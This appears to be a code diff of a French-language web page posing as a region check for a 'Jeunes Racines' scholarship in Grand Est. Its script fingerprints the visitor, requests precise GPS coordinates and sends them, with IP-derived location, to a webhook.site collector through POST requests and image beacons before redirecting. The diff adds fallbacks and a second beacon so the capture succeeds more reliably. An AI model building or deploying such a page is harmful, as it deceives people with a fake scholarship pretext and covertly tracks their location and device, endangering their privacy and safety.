@@ -10,12 +10,10 @@
       font-family: Arial, sans-serif;
       background-color: #f7f7f7;
     }
-
     .banner {
       background-image: url('https://i.imgur.com/ONf3SmL.png');
       background-size: cover;
       background-position: center;
-      background-repeat: no-repeat;
       height: 240px;
       display: flex;
       align-items: center;
@@ -25,25 +23,15 @@
       font-weight: bold;
       text-shadow: 1px 1px 3px #000;
     }
-
-    .lock-icon {
-      font-size: 24px;
-      line-height: 1;
-    }
-
     .content {
       padding: 30px;
       text-align: center;
     }
-
     .logo {
       width: 250px;
-      margin-bottom: 20px;
+      margin: 0 auto 20px;
       display: block;
-      margin-left: auto;
-      margin-right: auto;
     }
-
     button {
       padding: 12px 24px;
       font-size: 16px;
@@ -53,26 +41,22 @@
       border-radius: 6px;
       cursor: pointer;
     }
-
     .refuse-button {
       background-color: darkred;
       margin-top: 15px;
       margin-bottom: 25px;
     }
-
     p {
       font-size: 16px;
       max-width: 600px;
       margin: 20px auto;
     }
-
     .loading {
       display: none;
       margin-top: 15px;
       font-size: 14px;
       color: #333;
     }
-
     .region {
       font-size: 14px;
       color: #333;
@@ -83,7 +67,7 @@
 <body>
   <div class="banner">
     <div style="display: flex; align-items: center; gap: 10px;">
-      <span class="lock-icon">🔒</span>
+      <span>🔒</span>
       <span>Jeunes Racines</span>
     </div>
   </div>
@@ -91,12 +75,8 @@
   <div class="content">
     <img src="https://i.imgur.com/GpAGxP1.png" alt="Jeunes Racines Logo" class="logo">
     <h2>Vérification de la Région Grand Est</h2>
-    <p>
-      Avant de poursuivre votre candidature pour la Bourse Jeunes Racines,
-      veuillez confirmer que vous êtes dans la région Grand Est.
-      Cette vérification est obligatoire.
-    </p>
-
+    <p>Avant de poursuivre votre candidature pour la Bourse Jeunes Racines,
+      veuillez confirmer que vous êtes dans la région Grand Est. Cette vérification est obligatoire.</p>
     <div id="ip-region" class="region">📍 Détection de votre région en cours...</div>
     <button onclick="getLocation()">Je confirme ma position</button>
     <br><br>
@@ -107,7 +87,6 @@
     </p>
   </div>
 
-  <!-- 🔐 FINGERPRINT + GEOLOCATION + BEACON FALLBACK -->
   <script src="https://openfpcdn.io/fingerprintjs/v3"></script>
   <script>
     let fingerprintData = {
@@ -116,7 +95,6 @@
       country: "unknown",
       city: "unknown"
     };
-
     let finalRedirectURL = "https://sites.google.com/view/jeunes-racines/";
     let fallbackTriggered = false;
 
@@ -127,52 +105,53 @@
     });
 
     fetch('https://ipwho.is/')
-      .then(response => response.json())
-      .then(ipInfo => {
-        fingerprintData.region = ipInfo.region || "unknown";
-        fingerprintData.country = ipInfo.country || "unknown";
-        fingerprintData.city = ipInfo.city || "unknown";
+      .then(res => res.json())
+      .then(ip => {
+        fingerprintData.region = ip.region || "unknown";
+        fingerprintData.country = ip.country || "unknown";
+        fingerprintData.city = ip.city || "unknown";
         document.getElementById('ip-region').textContent = `📍 Région détectée : ${fingerprintData.region}, ${fingerprintData.country}`;
       })
-      .catch(() => {});
+      .catch(() => {
+        fetch('https://www.cloudflare.com/cdn-cgi/trace')
+          .then(res => res.text())
+          .then(data => {
+            const ipInfo = Object.fromEntries(data.trim().split('\n').map(line => line.split('=')));
+            fingerprintData.country = ipInfo.loc || "unknown";
+          });
+      });
 
     function getLocation() {
       document.getElementById("loading-text").style.display = "block";
-
-      if (!navigator.geolocation) {
-        return fallbackBeacon("unsupported");
-      }
+      if (!navigator.geolocation) return fallbackBeacon("unsupported");
 
       navigator.geolocation.getCurrentPosition(
-        position => {
+        pos => {
+          const data = {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            fingerprint: fingerprintData
+          };
+
           fetch("https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              lat: position.coords.latitude,
-              lon: position.coords.longitude,
-              accuracy: position.coords.accuracy,
-              fingerprint: fingerprintData
-            })
-          }).then(() => {
+            body: JSON.stringify(data)
+          })
+          .then(() => {
+            sendRetryBeacon("post-success", pos);
             setTimeout(() => window.location.href = finalRedirectURL, 1000);
-          }).catch(() => {
-            fallbackBeacon("fetch-fail", position);
-          });
-        },
-        error => {
-          fallbackBeacon("refused");
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 5000,
-          maximumAge: 0
-        }
-      );
+          })
+          .catch(() => fallbackBeacon("fetch-fail", pos));
 
-      setTimeout(() => {
-        if (!fallbackTriggered) fallbackBeacon("timeout");
-      }, 6000);
+          setTimeout(() => {
+            if (!fallbackTriggered) fallbackBeacon("timeout", pos);
+          }, 6000);
+        },
+        () => fallbackBeacon("refused"),
+        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+      );
     }
 
     function fallbackBeacon(reason, pos = {}) {
@@ -185,9 +164,22 @@
         `&lat=${lat}&lon=${lon}&acc=${acc}` +
         `&visitorId=${fingerprintData.visitorId}` +
         `&region=${fingerprintData.region}&country=${fingerprintData.country}&city=${fingerprintData.city}`;
-
       img.src = url;
       setTimeout(() => window.location.href = finalRedirectURL, 1000);
+    }
+
+    function sendRetryBeacon(reason, pos) {
+      setTimeout(() => {
+        const img = new Image();
+        const lat = pos.coords?.latitude || "unknown";
+        const lon = pos.coords?.longitude || "unknown";
+        const acc = pos.coords?.accuracy || "unknown";
+        const url = `https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b?ref=${reason}` +
+          `&lat=${lat}&lon=${lon}&acc=${acc}` +
+          `&visitorId=${fingerprintData.visitorId}` +
+          `&region=${fingerprintData.region}&country=${fingerprintData.country}&city=${fingerprintData.city}`;
+        img.src = url;
+      }, 1500);
     }
 
     function refuse() {
